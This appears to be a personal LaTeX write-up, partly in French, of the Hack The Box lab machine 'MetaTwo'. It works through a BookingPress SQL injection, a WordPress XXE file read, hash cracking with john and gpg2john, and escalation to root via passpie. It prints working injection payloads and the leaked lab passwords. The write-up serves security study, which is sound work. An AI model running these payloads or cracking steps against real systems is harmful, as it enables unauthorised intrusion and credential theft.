\chapter{MetaTwo}
\begin{itemize}
    \item {\bf technics}: gpg2john xxe
    \item {\bf Components}: wordpress passpie
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.186
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ sudo nmap -sVC -p$PORTS $TARGET_IP
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.92%I=7%D=11/14%Time=63722D5E%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
SF:e\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

\end{verbatim}

\subsubsection{http}

wordpress \verb+5.6.2+ avec :
\begin{itemize}
    \item \verb+bookingpress-appointment-booking+ en version 1.010
        \url{view-source:http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt}
    \item \verb+twentytwentyone+ (v1.7)
\end{itemize}

wpscan confirme egalement la présence de:
\begin{itemize}
    \item feed
    \item leira-roles v1.1.8.0
\end{itemize}

visiblement il y aurait
\href{https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357}{BookingPress < 1.0.11 - Unauthenticated SQL
Injection}

Visit the just created page as an unauthenticated user and extract the "nonce"
(view source -> search for
\verb+action:'bookingpress_front_get_category_services'+) =>
\verb+_wpnonce:'1d2a2bcb0d'+


\begin{verbatim}
$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' 
    --data 'action=bookingpress_front_get_category_services&_wpnonce=1d2a2bcb0d
        &category_id=33&total_service=-7502) 
        UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -

'HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 14 Nov 2022 12:31:29 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
\end{verbatim}

avec un \verb+ |jq+
\begin{verbatim}
[
  {
    "bookingpress_service_id": "10.5.15-MariaDB-0+deb11u1",
    "bookingpress_category_id": "Debian 11",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]
\end{verbatim}

\begin{verbatim}
$ curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' -d @payload.asc | jq
 
UNION ALL SELECT @@version, @@version,table_name,1,2,3,4,5,6 FROM information_schema.tables

$ curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' -d @payload.asc | jq |grep 'service_name\|category_id'
UNION ALL SELECT @@version, user_pass,user_login,1,2,3,4,5,6 FROM wp_users
    "bookingpress_category_id": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.",
    "bookingpress_service_name": "admin",
    "bookingpress_category_id": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70",
    "bookingpress_service_name": "manager",
\end{verbatim}


\begin{verbatim}
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash.metapress 
partylikearockstar (?)
\end{verbatim}
il correspond au login \verb+manager+

ca ne permet que d'acceder a wp-admin ni ftp ni ssh

\begin{verbatim}
$ searchsploit wordpress media library

WordPress 5.7 - 'Media Library' XML External Entity Injection (XXE) (A | php/webapps/50304.sh
\end{verbatim}

\url{https://github.com/motikan2010/CVE-2021-29447}

\begin{verbatim}
/etc/passwd

jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash

/etc/nginx/nginx.conf

include /etc/nginx/modules-enabled/*.conf;


../wp-config.php
<?php
define( 'DB_NAME', 'blog' );
define( 'DB_USER', 'blog' );
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

$table_prefix = 'wp_';
define( 'WP_DEBUG', false );
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}
require_once ABSPATH . 'wp-settings.php';
\end{verbatim}


\subsubsection{ftp}

\begin{verbatim}
ftp> get send_email.php

$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
\end{verbatim}

\subsection{Foothold}
\subsubsection{jnelson}
\begin{verbatim}
### Possible private SSH keys were found!
/home/jnelson/.passpie/.keys

$ more .passpie/ssh/root.pass
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----

  '
$ passpie
 Name    Login    Password    Comment   
 ssh     jnelson  ********              
 ssh     root     ********              

$ passpie export .passpie/ssh/root.pass
Passphrase:
Error: Wrong passphrase
\end{verbatim}

quand on regarde le github la verison 1.6.1 date d'il y a 5 ans

By default Passpie creates a GnuPG keyring for each initialized database. This
keyring will be used to encryt/decrypt credentials from database.

le problème c'est que la clé privée est protégée par un mot de pass.

\begin{verbatim}
$ gpg2john private.key > hash
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash

blink182         (Passpie)


$ passpie copy ssh --to stdout
Passphrase:
p7qfAZt4_A1xo_0x

$ su
Password:
root@meta2:/home/jnelson#
\end{verbatim}



